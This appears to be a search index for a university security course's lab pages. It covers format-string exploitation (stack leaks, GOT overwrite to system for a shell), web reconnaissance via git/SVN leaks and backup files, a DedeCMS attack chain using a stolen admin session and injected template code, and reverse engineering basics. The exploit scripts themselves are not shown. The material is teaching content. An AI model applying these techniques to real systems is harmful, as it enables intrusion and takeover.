<code>nc 116.7.234.225 port</code></p> </li> <li> <p>inside university <code>nc 10.20.55.12 port</code></p> </li> </ol>"},{"location":"CS315/Lab%202%20Secure%20Coding%20and%20Buffer%20Overflows/#love-kernel","title":"Love kernel","text":"<p>(None)</p> <p><code>nc 103.102.44.94 8306</code></p>"},{"location":"CS315/Lab%203%20Secure%20Coding%20and%20Format-String%20Vulnerability/","title":"Lab 3: Secure Coding and Format-String Vulnerability","text":""},{"location":"CS315/Lab%203%20Secure%20Coding%20and%20Format-String%20Vulnerability/#formatted-string-vulnerability","title":"Formatted String Vulnerability","text":""},{"location":"CS315/Lab%203%20Secure%20Coding%20and%20Format-String%20Vulnerability/#basic-principles-of-formatted-string-vulnerability","title":"Basic Principles of Formatted String Vulnerability","text":"<p>The commonly used formatted output functions in C are as follows:</p> <p></p> <p></p> <p>Their usage is similar, and this section uses printf as an example. In C, the conventional usage of printf is:</p> <p></p> <p>where the first parameter of the function with %d, %s, and other placeholders is called a formatted string, and the placeholders are used to specify how the output parameter values are formatted.</p> <p>The syntax of the placeholders is:</p> <p></p> <p>parameter can be ignored or for n$, n means that this placeholder is the first parameter passed in.</p> <p>flags can be zero or more, mainly including:</p> <p>\u2756 +- always indicates a '+' or '-' for a signed value, ignores the sign of positive numbers by default, and applies only to numeric types.</p> <p>\u2756 Space - output of signed numbers is prefixed with 1 space if there is no plus or minus sign or 0 characters are output.</p> <p>\u2756 --Left justified, default is right justified.</p> <p>\u2756 # - For 'g' and 'G', the trailing 0 is not removed to indicate precision; for 'f', 'F', 'e', 'E', 'g', and 'G', the decimal point is always output; for 'o', 'x', and 'X', the prefix 0, 0x, and 0X are output before the non-zero value to indicate the number system, respectively.</p> <p>\u2756 0- in front of the width option, indicating padding with 0.</p> <p>field width gives the minimum width of the displayed value, which is used to fill a fixed width when outputting. If the actual number of output characters is less than the field width, it will be filled according to left-aligned or right-aligned, and the negative sign is interpreted as left-aligned flag. If the domain width is set to \"*\", the value of the corresponding function parameter is the current domain width.</p> <p>precision usually specifies the maximum length of the output, depending on the specific formatting type:</p> <p>\u2756 For integer values of d, i, u, x, and o, the minimum number of digits, with any shortfall being filled with zeros on the left.</p> <p>\u2756 For floating-point values of a, A, e, E, f, and F, the number of digits displayed to the right of the decimal point.</p> <p>\u2756 For floating-point values of g, G, refers to the maximum number of significant digits.</p> <p>\u2756 For the string type of s, it refers to the upper limit of the output bytes.</p> <p>If the domain width is set to \"*\", the value of the corresponding function parameter is the precision current domain width.</p> <p>length indicates the length of the floating-point argument or integer argument:</p> <p>\u2756 hh-matches an integer argument of size int8 (1 byte).</p> <p>\u2756 h-Matches an integer argument of size int16 (2 bytes).</p> <p>\u2756 l-matches integer parameters of size long for integer types, double for floating point types, wchar_t pointer parameters for string s types, and wint_t parameters for character c types.</p> <p>\u2756 ll-matches integer parameters of size long long.</p> <p>\u2756 L-matches integer parameters of size long double.</p> <p>\u2756 z-Matches integer parameters of size_t size.</p> <p>\u2756 j-Matches integer parameters of size intmax_t.</p> <p>\u2756 t-matches an integer parameter of size ptrdiff_t.</p> <p>The type representation is as follows:</p> <p>\u2756 d, i-Signed decimal int values.</p> <p>\u2756 u-Decimal unsigned int value.</p> <p>\u2756 f, F-Decimal double values.</p> <p>\u2756 e, E-double value, the output form is \"[-]d.ddd e[+/-]ddd\" in decimal.</p> <p>\u2756 g, G-double values, with f or e format automatically selected depending on the size of the value.</p> <p>\u2756 x, X-hexadecimal unsigned int values.</p> <p>\u2756 o-Octal unsigned int value.</p> <p>\u2756 s-A string ending in \\x00.</p> <p>\u2756 c-A char type character.</p> <p>\u2756 p-void* pointer type value.</p> <p>\u2756 a, A-double type hexadecimal representation, i.e., \"[-]0xh.hhhh p\u00b1d\", with the exponent part in the form of decimal representation.</p> <p>\u2756 n-Writes the number of characters that have been successfully output to the variable referred to by the corresponding integer pointer parameter.</p> <p>\u2756 %-'%' literal value, does not accept any flags, width, precision or length.</p> <p>If the formatted string of printf in the program is controllable, the printf function will take data from the register or stack corresponding to the location of the argument as an argument to read or write even if the corresponding argument is not filled in at the time of the call, which can easily result in arbitrary address reading and writing.</p>"},{"location":"CS315/Lab%203%20Secure%20Coding%20and%20Format-String%20Vulnerability/#basic-exploitation-of-formatted-string-vulnerability","title":"Basic Exploitation of Formatted String Vulnerability","text":"<p>The formatted string vulnerability allows for arbitrary memory reads and writes. Since function parameters are passed through the stack, the data on the stack can be leaked using \"%X$p\" (X is an arbitrary positive integer). Moreover, if you can control the data on the stack, you can write the address you want to leak on the stack in advance, and then use \"%X$p\" to output the address you want to leak as a string.</p> <p>In addition, since \"%n\" can write the number of characters that have been successfully output to the variable indicated by the corresponding integer pointer parameter, it is possible to arrange the address of the memory you want to write on the stack in advance. Then you can write to any memory by using \"%Yc%X$n\" (Y is the data you want to write).</p> <p></p> <p>Compile the program in Example 6-5-1 with the following command:</p> <p></p> <p>Set a breakpoint at printf, when RSP is exactly where we entered the string, i.e., the 6th argument (the first 5 arguments and formatted string of 64-bit Linux are passed by registers), and we enter \"AAAAAAAAA%6$p\".</p> <p></p> <p>The program does output the 8 A's entered as pointer variables, and we can use this to leak information first.</p> <p>The stack contains the return address pressed in before __libc_start_main calls __libc_csu_init (see Figure 6-5-1), and based on this address, we can calculate the base address of libc, which can be calculated at the location of the 21st argument; similarly, _start is at the location of the 17th argument, through which we can calculate the base address of the fsb program. The base address of the fsb program can be calculated by using it.</p> <p></p> <p></p> <p>Once you have the libc base address, you can calculate the address of the system function, and then modify the address of the printf function in the GOT table to the address of the system function. The next time you execute printf(format), you will actually execute system(format) and enter format as \"/bin/sh\" to get the shell. use the script as follows.</p> <p></p> <p></p> <p>The script splits system's address (6 bytes) into 3 words (2 bytes) because if you output more than one int-type byte at a time, printf will output several gigabytes of data, which may be very slow when attacking a remote server, or cause a broken pipe (broken pipe). Note that in 64-bit programs, the address often accounts for only 6 bytes, that is, the high 2 bytes must be \"\\x00\", so the 3 addresses must be placed at the end of the payload, and not at the top. Although placed at the top, the offset is better calculated, but printf output string is up to \"\\x00\", the \"\\x00\" in the address will truncate the string, after the placeholder used to write the address will not take effect.</p>"},{"location":"CS315/Lab%203%20Secure%20Coding%20and%20Format-String%20Vulnerability/#how-to-use-formatted-strings-that-are-not-on-the-stack","title":"How to use formatted strings that are not on the stack","text":"<p>Sometimes the input string is not stored on the stack, so there is no way to directly address the stack to control the printf arguments, which is a relatively complicated situation.</p> <p>Because the program has the operation of pressing rbp onto the stack when calling a function or putting some pointer variables on the stack, there will be many pointers on the stack that hold the address on the stack, and it is easy to find three pointers p1, p2, p3, forming a situation where p1 points to p2 and p2 points to p3, then we can first use p1 to modify the lowest 1 byte of p2, which can make p2 point to p3 pointer 8 bytes of Any 1 byte and modify it, so that p3 can be modified byte by byte to become any value, indirectly controlling the data on the stack.</p> <p></p> <p></p> <p>Compile the program of Example 6-5-2 with the following command:</p> <p></p> <p>Set a breakpoint at printf, at this point the stack distribution is shown in Figure 6-5-2. The pointer saved at 0x7ffffffee030 points to 0x7ffffffee060, and the pointer saved at 0x7ffffffee060 points to 0x7ffffffee080, which satisfies the above requirements. These three pointers are at printf No. 10, 16, and 20 arguments. The program requests a block of memory to hold the input string before the loop executes 30 times of input and output, which will be released at the end of the loop and then exits the program. We can change the value at 0x7ffffffee080 to the address of the free function item in the GOT table, and change the function pointer there to the address of the system function. This way, when executing free (format), what is actually executed is system (format), just type \"/bin/sh\" to get the shell.</p> <p></p> <p>The complete script is as follows:</p> <p></p> <p></p> <p></p>"},{"location":"CS315/Lab%203%20Secure%20Coding%20and%20Format-String%20Vulnerability/#some-special-uses-of-formatted-strings","title":"Some special uses of formatted strings","text":"<p>Formatting strings sometimes encounters some rare placeholders, such as \"*\" to take the value of the corresponding function argument as the width, printf (\"%*d\", 3, 1) to output \" 1\".</p> <p></p> <p>As in Example 6-5-3, guessing the sum of two numbers, you can get the shell after guessing right. not considering the case of blasting, although the formatted string can leak the value of these two numbers, but the input is before the leak, after the leak has been unable to modify the guessed value, so you must use this opportunity to fill in the sum of a and b directly to num, which requires the use of placeholder \"*\".</p> <p>Set a breakpoint at printf(buf), at this point the data on the stack is shown in Figure 6-5-3. a and b numbers (0x1b2d and 0xc8e3 respectively) are in the 8th and 9th argument positions, and num_ptr is in the 11th argument position. a and b numbers are used as two output widths, and the number of characters output is the sum of a and b. Then use \"% n\" is written into num to achieve the effect of num==a+b.</p> <p></p> <p>The script is as follows:</p> <p></p>"},{"location":"CS315/Lab%203%20Secure%20Coding%20and%20Format-String%20Vulnerability/#formatted-strings-summary","title":"Formatted Strings Summary","text":"<p>Formatted strings utilize ultimately arbitrary address reading and writing, and a program that can do arbitrary address reading and writing is not far from full control.</p> <p>Sometimes programs turn on the Fortify protection mechanism so that all printf() is replaced by __printf_chk() when the program is compiled. The difference between the two is as follows:</p> <p>\u2756 When using positional arguments, you must use all arguments in the range and cannot print discontinuously using positional arguments. For example, to use \"%3$x\", you must use both \"%1$x\" and \"%2$x\".</p> <p>\u2756 A formatted string containing \"%n\" cannot be located at a writable address in memory.</p> <p>While it is difficult to write to arbitrary addresses at this point, it is possible to exploit arbitrary address reads for information leakage, which can be used in conjunction with other vulnerabilities.</p>"},{"location":"CS315/Lab%203%20Secure%20Coding%20and%20Format-String%20Vulnerability/#assignment","title":"Assignment","text":""},{"location":"CS315/Lab%203%20Secure%20Coding%20and%20Format-String%20Vulnerability/#1-easy-fmt","title":"(1 - Easy) fmt","text":"<p>Read the flag from stack!</p> <p>This challenge must create a dynamic docker and connect via domain name <code>detroit.sustech.edu.cn</code> or IP address.</p> <ol> <li>Outside university <code>nc 116.7.234.225 port</code></li> <li>inside university <code>nc 10.20.55.12 port</code> or <code>nc detroit.sustech.edu.cn port</code></li> </ol>"},{"location":"CS315/Lab%203%20Secure%20Coding%20and%20Format-String%20Vulnerability/#2-medium-write","title":"(2 - Medium) write","text":"<p>If you are lucky enough, you would win.</p> <p>This challenge must create a dynamic docker and connect via domain name <code>detroit.sustech.edu.cn</code> or IP address.</p> <ol> <li>Outside university <code>nc 116.7.234.225 port</code></li> <li>inside university <code>nc 10.20.55.12 port</code> or <code>nc detroit.sustech.edu.cn port</code></li> </ol>"},{"location":"CS315/Lab%203%20Secure%20Coding%20and%20Format-String%20Vulnerability/#3-mediumhard-got","title":"(3 - Medium/Hard) got","text":"<p>I just want to <code>exit</code> instead of <code>return</code>.</p> <p>This challenge must create a dynamic docker and connect via domain name <code>detroit.sustech.edu.cn</code> or IP address.</p> <ol> <li>Outside university <code>nc 116.7.234.225 port</code></li> <li>inside university <code>nc 10.20.55.12 port</code> or <code>nc detroit.sustech.edu.cn port</code></li> </ol>"},{"location":"CS315/Lab%204%20Scanning%2C%20Reconnaissance%2C%20and%20Penetration%20Testing/","title":"Lab 4: Scanning, Reconnaissance, and Penetration Testing","text":"<p>In the traditional CTF online competition, Web class is one of the main types of questions, compared to binary, reverse and other types of questions, participants do not need to master the underlying knowledge of the system; compared to cryptography, miscellaneous issues, does not require a particularly strong programming skills, so it is easier to start. web class topics common types of vulnerabilities include injection, XSS, file inclusion, code execution, upload, SSRF, etc. This chapter will introduce the CTF online vulnerabilities.</p> <p>This chapter will introduce various common Web vulnerabilities in the CTF online competition, and through the analysis of relevant examples, the reader will have a relatively comprehensive understanding of the CTF online competition Web topics as much as possible. However, the classification of Web vulnerabilities is very complicated, so we hope that readers can learn about them on the Internet while reading this book, so that they can learn from one example to improve their own abilities.</p> <p>According to the frequency of vulnerabilities, the complexity of vulnerabilities, we will be divided into Web class topics into introductory, advanced, and expansion of the three levels of introduction. When explaining each level of vulnerability, we supplemented with relevant example problem analysis, so that readers can more intuitively understand the impact of different vulnerabilities in the CTF online competition Web class topics, from the shallow to deep understanding of Web class topics, clear their own skill deficiencies, so as to achieve the purpose of making up. This chapter starts from the \"Getting Started\" level and introduces the three most common types of vulnerabilities in the Web category, namely information gathering, SQL injection, and arbitrary file reading vulnerabilities.</p>"},{"location":"CS315/Lab%204%20Scanning%2C%20Reconnaissance%2C%20and%20Penetration%20Testing/#pivotal-information-gathering","title":"Pivotal information gathering","text":""},{"location":"CS315/Lab%204%20Scanning%2C%20Reconnaissance%2C%20and%20Penetration%20Testing/#the-importance-of-information-gathering","title":"The importance of information gathering","text":"<p>As the old saying goes, \"If you know yourself and your enemy, you will never lose a hundred battles\". In the Web category of the CTF online competition, information gathering covers a wide range of topics, including backup files, directory information, Banner information, etc. This requires participants to have a lot of experience or to use some scripts to help them find information and exploit vulnerabilities in the topic. This section will describe as much as possible the information collection contained in the Web category of the CTF online competition, and will also recommend some open source tools and software that have been tested by the authors.</p> <p>Because most of the information gathering is the use of tools (git leaks may involve the application of git commands), this chapter may not have much technical detail. At the same time, because there are more kinds of information gathering, this chapter will cover as much as possible, so please understand if there are any shortcomings; at the end, it will reflect the importance of information gathering through practical examples of competitions.</p>"},{"location":"CS315/Lab%204%20Scanning%2C%20Reconnaissance%2C%20and%20Penetration%20Testing/#classification-of-information-gathering","title":"Classification of information gathering","text":"<p>Preliminary information gathering on the topic may have a very important role in solving the topic of CTF online competition. The following will talk about the basic information gathering from three aspects: sensitive directory, sensitive backup file, and Banner identification, and how to discover the direction of solving the problem in CTF online competition.</p>"},{"location":"CS315/Lab%204%20Scanning%2C%20Reconnaissance%2C%20and%20Penetration%20Testing/#sensitive-directory-leakage","title":"Sensitive Directory Leakage","text":"<p>Through sensitive directory leakage, we can often obtain the source code and sensitive URL addresses of websites, such as the backend address of websites, etc.</p> <p>1. git leakage</p> <p>[Vulnerability Introduction] git is a mainstream distributed version control system, developers often forget the .git folder in the development process, leading to attackers can obtain all the information in the .git folder that developers have submitted This allows attackers to access all the source code committed by the developer through the information in the .git folder, which may lead to the server being compromised by the attack.</p> <p>(1) Conventional git leaks Conventional git leaks:</p> <p>without any other operations, the participant can obtain the website source code or flags by using ready-made tools or scripts written by themselves. Here is a recommended tool: https://github.com/denny0223/scrabble, the use of which is also very simple.</p> <pre><code>./scrabble http://example.com/\n</code></pre> <p>Build the Web environment locally by yourself, see Figure 1-1-1.</p> <p></p> <p>Run the tool, you can get the source code, get the flag, see Figure 1-1-2.</p> <p></p> <p>(2) git rollback</p> <p>As a version control tool, git records every commit, so when there is a git leak, the flag (sensitive) file may be deleted or overwritten in the revision, then we can use git's \"git reset\" command to restore to the previous version. See Figure 1-1-3 for a local web environment.</p> <p></p> <p>We first use the scrabble tool to get the source code, and then use the \"git reset--hard HEAD^\" command to jump to the previous version (in git, the current version is represented by HEAD, and the previous version is HEAD^) to get the source code, see Figure 1-1-4.</p> <p></p> <p>In addition to using \"git reset\", a simpler way to see what files have been modified by each commit is to use the \"git log-stat\" command, and then use \"git diff HEAD commit-id\" to compare the changes between the current version and the commit you want to see.</p> <p>(3) git branches</p> <p>Each time you commit, git automatically strings them together into a timeline, which is a branch. And git allows multiple branches, thus allowing users to separate work from the main development thread so that it doesn't interfere with it. If no new branches are created, then there is only one timeline, i.e., only one branch, which defaults to the master branch in git. So the flags or sensitive files we are looking for may not be hidden in the current branch, so using the \"git log\" command will only find the changes made on the current branch, but not the information we want, so we need to switch branches to find the files we want.</p> <p>Most off-the-shelf git leaks do not support branches, so if you need to restore code from another branch, you often need to extract the files by hand, so here is an example of the more powerful GitHacker (https://github.com/WangYihang/GitHacker) tool. Just run the command \"python GitHacker.py http://127.0.0.1:8000/.git/\". Once you run it, you'll see the folder you created locally, but if you run \"git log--all\" or \"git branch-v\", you'll only see the master branch. If you run \"git reflog\", you can see some checkout records, see Figure 1-1-5.</p> <p></p> <p>As you can see, there is a secret branch in addition to the master branch, but the automation tool only restores the information of the master branch, so you need to manually download the head information of the secret branch and save it to .git/refs/heads/secret (execute the command \"wget http:// 127.0.0.1:8000/.git/refs/heads/secret\"). After restoring the head information, we can reuse some of the GitHacker code to automate the branch restoration process. As you can see in GitHacker's code, he downloads the object file first, then uses git fsck to detect it, and continues to download the missing file. Here you can directly reuse the fixmissing function that detects missing files and restores them. Let's comment out the last part of the program that calls main and change it to the following code.</p> <p></p> <p>If you run \"python GitHacker.py\" again, go to the folder you created, and run \"git log--all\" or \"git branch-v\" command, you will be able to recover the secret branch information, find the corresponding commit hash from the git log, and execute the command \"git diff HEAD b94c\" (b94c is the first 4 bits of the hash) to get the flag, see Figure 1-1-6.</p> <p></p> <p>(4) Other uses of git leaks</p> <p>In addition to the common exploit of viewing the source code, the leaked git may also contain other useful information, such as the .git/config folder may contain access_token information, which allows access to other repositories of this user.</p> <p>2. SVN vulnerability</p> <p>SVN (subversion) is the source code version management software, the main reason for SVN source code vulnerability is the administrator's irregular operation to expose the SVN hidden folder to the external network environment, you can use the .svn/entries or wc.db file to obtain the server source code and other information. Here we recommend two tools: https://github.com/kost/dvcs-ripper and Seay-svn (source code backup vulnerability exploit tool for Windows).</p> <p>3. HG leak</p> <p>When initializing the project, HG will create a .hg hidden folder under the current folder, which contains information such as code and branch modification records. Here is a recommended tool: https://github.com/kost/dvcs-ripper.</p> <p>4. Summary of experience</p> <p>Whether it is .git these hidden files or sensitive backend folders like admin in practice, the key lies in the power of the dictionary, and the reader can do secondary development on the basis of certain tools to meet their needs. Here is a recommended open source directory scanning tool: https://github.com/maurosoria/dirsearch.</p> <p>CTF online competitions often have problems with redirects of one kind or another. For example, as soon as you visit .git, it will return 403, at this time try to visit .git/config, if there are file content returned, it means that there is a git leak, and vice versa, generally does not exist. In SVN leaks, the source code is usually crawled in the entries, but sometimes there are cases where the entries are empty, then pay attention to the existence of the wc.db file or not, and you can get the source code in the pristine folder through the checksum there.</p>"},{"location":"CS315/Lab%204%20Scanning%2C%20Reconnaissance%2C%20and%20Penetration%20Testing/#sensitive-backup-files","title":"Sensitive backup files","text":"<p>Through some sensitive backup files, we can often get the source code of a file, or the whole directory of a website, etc.</p> <p>1. gedit backup files</p> <p>Under Linux, after saving with the gedit editor, a file with the suffix \"~\" will be generated in the current directory, whose contents are the contents of the file just edited. Assuming that the name of the file you just saved is flag, the file name is flag ~, see Figure 1-1-7. Access this file with \"~\" through your browser to get the source code.</p> <p></p> <p>vim is currently the most used Linux editor. When a user is editing a file but quits unexpectedly (e.g., when connecting to the server via SSH, you may encounter an unexpected exit due to a command line jam caused by insufficient network speed in the process of editing a file with vim), a backup file will be generated in the current directory with the following file name format</p> <pre><code>.filename.swp\n</code></pre> <p>This file is used to backup the contents of the buffer, i.e. the contents of the file at the time of exit, see Figure 1-1-8.</p> <p></p> <p>For the SWP backup file, we can use the \"vim-r\" command to restore the contents of the file. Here we simulate the execution of \"vim flag\" command first, and then close the client directly, a .flag.swp file will be generated in the current directory. To restore the SWP backup file, first create a flag file in the current directory, and then use the \"vim-r flag\" command to get the contents edited during the accidental exit, see Figure 1-1-9.</p> <p></p> <p>Regular files rely on the saturation of dictionaries, whether in CTF competitions or in the real world, we will encounter some classic and recognizable files, so that we can better understand the site. Here are just a few simple examples, the specific needs of the reader to collect records by heart.</p> <p>\u2756 robots.txt: record some directory and CMS version information.</p> <p>\u2756 readme.md: Record CMS version information, some even have Github address.</p> <p>\u2756 www.zip/rar/tar.gz: It is often the source code backup of the website.</p> <p>4. Summary of experience</p> <p>In the process of CTF online competition, the questioner will often operate and maintain the question online, and sometimes various situations will lead to the generation of SWP backup files, so the reader can write real-time monitoring scripts to monitor the question service during the competition.</p> <p>The backup file generated by vim in the first unexpected exit is .swp, the one in the second unexpected exit is .swo, the one in the third exit is .swn, and so on. vim's official manual also has backup files of type .un.filename.swp.</p> <p>Also, in a real-world environment, backups of a website may often be a zip archive of the website domain.</p>"},{"location":"CS315/Lab%204%20Scanning%2C%20Reconnaissance%2C%20and%20Penetration%20Testing/#banner-recognition","title":"Banner recognition","text":"<p>In CTF online competition, the Banner information (some basic information displayed by the server to the outside world) of a website has a very important role in solving the problem, and players can often use the Banner information to get ideas for solving the problem. For example, when we know that the website is written with ThinkPHP web framework, we can try the relevant historical vulnerability of ThinkPHP framework. Or when we learn that the site is a Windows server, then we can try based on the characteristics of Windows when testing for upload vulnerabilities. Here are the two most common ways to identify Banner.</p> <p>1. collect your own fingerprint library</p> <p>Github has a large number of formed and publicly available CMS fingerprint library, readers can find their own, and at the same time can draw on some formed scanners to identify the site.</p> <p>2. Use existing tools</p> <p>We can use the Wappalyzer tool (see Figure 1-1-10), which also provides a well-formed Python library with the following usage.</p> <p></p> <p></p> <p>In the data directory, the apps.json file is its rule base, and readers are free to add it according to their needs.</p> <p>3. Summary of experience</p> <p>In the server Banner information detection, in addition to the two common identification methods mentioned above, we can also try to enter some random URLs, and sometimes we can find some information through 404 pages and 302 bounce pages. For example, a ThinkPHP website with debug option turned on will show the version of ThinkPHP on some error pages.</p>"},{"location":"CS315/Lab%204%20Scanning%2C%20Reconnaissance%2C%20and%20Penetration%20Testing/#from-information-gathering-to-topic-resolution","title":"From information gathering to topic resolution","text":"<p>The following is a replay of a CTF range race scenario to show how to go from information gathering to getting flags.</p> <p>1. Environment information</p> <p>\u2756 Windows 7.</p> <p>\u2756 PHPstudy 2018 (with directory traversal turned on).</p> <p>\u2756 DedeCMS (Weaving Dream CMS, member registration not turned on).</p> <p>2. Solution steps</p> <p>By visiting the website, according to the observation and Wappalyzer's prompt (see Figure 1-1-11 and Figure 1-1-12), we can find that this is DedeCMS built on Windows, and visiting the default backend directory is found to be 404, see Figure 1-1-13.</p> <p></p> <p></p> <p></p> <p>At this point we can associate DedeCMS on Windows server there is a backend directory blasting vulnerability (the cause of the vulnerability is not described here, the reader can check), we run the local blasting script, get the directory zggga111, see Figure 1-1-14.</p> <p></p> <p>However, after testing, we found that the member registration function is turned off, which means we cannot use the member password reset vulnerability to reset the administrator password. What should we do? In fact, in DedeCMS, as long as the administrator has logged in the background, there will be a corresponding session file in the data directory, and this topic happens not to close the directory traversal, see Figure 1-1-15. so we can get the administrator's session value, modify the cookie through editcookie, so as to successfully enter the background, see Figure 1- 1-16.</p> <p></p> <p></p> <p>Then insert a piece of malicious code in the template's tag source fragment management to execute any command, see Figure 1-1-17 and Figure 1-1-18.</p> <p></p> <p></p> <p>3. Summary</p> <p>This example can reflect the importance of information gathering in two ways.</p> <p>\u2756 One is the information of the server, for Windows server, the probability means we go to find some vulnerability of CMS on it.</p> <p>\u2756 The second is the final RCE (Remote Command/Code Execute) through the characteristics of the CMS website itself combined with directory traversal without knowing the password and being unable to reset it.</p>"},{"location":"CS315/Lab%205%20Reverse%20Engineering%20and%20Obfuscation/","title":"Lab 5: Reverse Engineering and Obfuscation","text":"<p>Reverse engineering is a technical process of analyzing and studying a target product in reverse, so as to deduce and derive design elements such as processing flow, organization, functional performance specifications, etc., in order to produce a product with similar but not identical functions. In CTF, reverse engineering generally refers to software reverse engineering, i.e., analyzing the executable file that has been compiled, studying the behavior and algorithm of the program, and then using it as a basis to calculate the flags that the questioner wants to hide.</p>"},{"location":"CS315/Lab%205%20Reverse%20Engineering%20and%20Obfuscation/#reverse-engineering-basics","title":"Reverse Engineering Basics","text":""},{"location":"CS315/Lab%205%20Reverse%20Engineering%20and%20Obfuscation/#overview-of-reverse-engineering","title":"Overview of Reverse Engineering","text":"<p>Generally, the reverse engineering topic in CTF is in the form of: the program receives an input from the user, and carries out a series of verification algorithms in the program, and if it passes the verification, it will indicate success, at which time the input is the flag. these verification algorithms can be mature encryption and decryption scheme, or can be the author's own algorithm. For example, a mini-game uses the user's input as the operation step of the game to judge, etc. These types of topics require participants to have certain algorithmic skills, thinking skills, and even association skills.</p> <p>This section will introduce the basics needed to get started with CTF inverse topics and introduce common tools, assuming the reader has some basic knowledge of C.</p>"},{"location":"CS315/Lab%205%20Reverse%20Engineering%20and%20Obfuscation/#executable-files","title":"Executable files","text":"<p>The object of software reverse engineering analysis is a program, i.e., one or more executable files. The following is a brief introduction to the formation process of executable files and common executable file types, so that readers can have a preliminary knowledge of them.</p> <p>1. The formation process of executable files (compilation and linking)</p> <p>For readers who are new to this area, it is crucial to form a proper understanding and sense of executable files. Again, as something created by human civilization, executable files are not generated directly as if by magic, but through a series of steps.</p> <p>The vast majority of normal executables are generated by compiling a high-level language. In general, these processes occur when compiling:</p> <p>&lt;1&gt; The user takes a set of source code written in a high-level language as input to the compiler.</p> <p>&lt;2&gt; The compiler parses the input and generates the corresponding assembly code for each source code file.</p> <p>&lt;3&gt; The assembler receives the compiler-generated assembly code and continues to perform assembly operations, temporarily storing each copy of the generated machine code in the respective object file.</p> <p>&lt;4&gt; Now multiple object files have been generated, but the final goal is to generate an executable file. So the linker gets involved, interconnecting the scattered object files and processing them into a complete program. Then, according to the format of the executable file, it fills in various parameters specifying the running environment of the program and finally forms a complete executable file.</p> <p>In the actual environment, there is more or less information loss in each step of the process due to the need to consider the size of the generated executable, the runtime performance of the executable, and the protection of information. For example, the comment information in the source code is generally discarded in the compilation stage, the label (label) name in the assembly code may be discarded in the assembly, and the symbolic information such as function name and type name may be discarded in the linking.</p> <p>Reverse requires the use of knowledge and experience to restore some of this information, and thus restore all or part of the program flow to achieve various purposes of the analyst.</p> <p>2. Executable files in different formats</p> <p>In practice, due to historical legacy and competition between companies, etc., the various files generated in each step described above will have multiple file formats. For example, Windows systems use PE (Portable Executable) executables, while Linux systems use ELF (Executable and Linkable Format) executables. Since both executable formats are developed from COFF (Common File Format) format, various concepts in the file structure are very similar.</p> <p>PE file consists of DOS header, PE file header, section table and data of each section; meanwhile, if you need to refer to external dynamic link library, there is import table; if you can provide functions to other programs to dynamically.</p> <p>The ELF file consists of the ELF header, section data, section table, string segment, and symbol table.</p> <p>Sections are logical divisions of sections in a program, usually with specific names, such as .text or .code for code sections, .data for data sections, etc. At runtime, the sections of an executable are loaded into various locations in memory, and one or more sections are mapped into a Segment for ease of management and to save overhead. Segments are divided according to the permissions (read, write, execute) required for this part of memory. If an illegal operation is performed in the corresponding segment, such as a write operation in a code segment that can only be read and executed, a Segmentation Fault is generated.</p> <p>Since the basic format details of PE and ELF are fully disclosed and there are a lot of mature tools for parsing and modifying them, we will not explain these format details in detail here.</p>"},{"location":"CS315/Lab%205%20Reverse%20Engineering%20and%20Obfuscation/#assembly-language-basics","title":"Assembly Language Basics","text":"<p>After parsing the file, the reverser is confronted with a large piece of machine code, which is directly generated by the assembly language.</p> <p>The following is an introduction to the key concepts of assembly language, so that readers can quickly understand assembly language.</p> <p>1. Registers, memory and addressing</p> <p>Register is a part of CPU, which is a high-speed storage component with limited storage capacity, used to temporarily store instructions, data and addresses. A typical IA-32 (Intel Architecture, 32-bit), or x86 architecture processor contains the following registers that are explicitly visible in instructions:</p> <p>\u2756 General-purpose registers EAX, EBX, ECX, EDX, ESI, EDI.</p> <p>\u2756 Top-of-stack pointer register ESP, bottom-of-stack pointer register EBP.</p> <p>\u2756 Instruction counter EIP (holds the address of the next address of the next instruction to be executed).</p> <p>\u2756 Segment registers CS, DS, SS, ES, FS, GS.</p> <p>For the x86-64 architecture, based on these registers above, the prefix E is changed to R to mark 64 bits, and eight general-purpose registers, R8 to R15, are added. In addition, for the 16-bit case, the prefix E is removed altogether. 16-bit, there are certain restrictions on the use of registers, which will not be repeated in this book since they are not mainstream now.</p> <p>For general-purpose registers, the program can use all of them or only part of them. The corresponding helpers for different parts of the registers are shown in Figure 5-1-1, where the naming rules for splitting R8 to R15 are R8d (low 32 bits), R8w (low 16 bits) and R8b (low 8 bits).</p> <p></p> <p>There is also a flag register in the CPU, where each bit indicates the value of the corresponding flag bit. The commonly used flag bits are as follows.</p> <p>\u2756 AF: Auxiliary Carry Flag, set to 1 when the result of the operation is entered in the third bit.</p> <p>\u2756 PF: Parity Flag, set to 1 when the lowest valid byte of the operation result has an even number of ones.</p> <p>\u2756 SF: Sign Flag, set to 1 when the sign bit of the sign shaping is 1, representing that it is It means it is a negative number.</p> <p>\u2756 ZF: Zero Flag, set to 1 when the operation result is all zeros.</p> <p>\u2756 OF: Overflow Flag, set to 1 when the operation result is a signed number and overflows.</p> <p>\u2756 CF: Carry Flag, set to 1 when the operation result is fed above the highest bit, used to determine the overflow of unsigned numbers.</p> <p>The CPU can operate not only on registers, but also on memory cells, so there are many different addressing methods. Table 5-1-1 shows the different addressing methods of CPU, examples and the corresponding operation objects.</p> <p></p> <p>It is easy to see that \"[]\" is equivalent to the \"*\" operator in C (indirect access).</p> <p>In the x86/x64 architecture, the four addressing methods, namely register indirect addressing, base addressing, variable addressing, and base plus variable addressing, are almost identical in terms of the functions they achieve, but there are semantic differences. In the 16-bit era, these four addressing methods cannot be mixed. In modern compilers, the compiler will choose the appropriate addressing method based on semantics and optimization.</p> <p>2. x86/x64 assembly language</p> <p>The x86/x64 assembly language exists in two display/writing styles, Intel and AT&amp;T, and this chapter will unify the Intel style.</p> <p>What is machine code? What is assembly language? Machine code is a binary instruction executed directly on the CPU, and assembly language is a kind of helper for machine language, assembly language and machine code are one-to-one correspondence. Machine code varies according to CPU architecture. The most common CPU architectures for CTF and usual are x86 and x86-64 (x64).</p> <p>The basic format of x86/x64 assembly instructions is as follows.</p> <p>Where the presence or absence and form of operands is determined by the type of operand. Due to space limitation, this section cannot describe the format and functions of various instructions in an exhaustive manner. Table 5-1-2 gives the forms, functions, and corresponding high-level language writing methods of several common instructions. Entry-level CTF participants do not need to master how to write assembly language programs fluently, but only need to master the common instructions described below and be able to read and understand them when they encounter them.</p> <p></p> <p>There are many conditional jump instructions in assembly language, and they will jump conditionally depending on the flag bits. A cmp instruction for comparison often exists before the conditional jump instruction and will set the flag bit accordingly based on the result of the comparison (the effect on the flag bit is equivalent to the sub instruction).</p> <p>Table 5-1-3 shows the common conditional jump instructions and the cmp and flag bits they are based on.</p> <p></p> <p>3. Disassembly</p> <p>While high-level languages often require a complex compilation process, the assembly process simply translates the assembly statements directly into the corresponding machine code and places the statements directly adjacent to 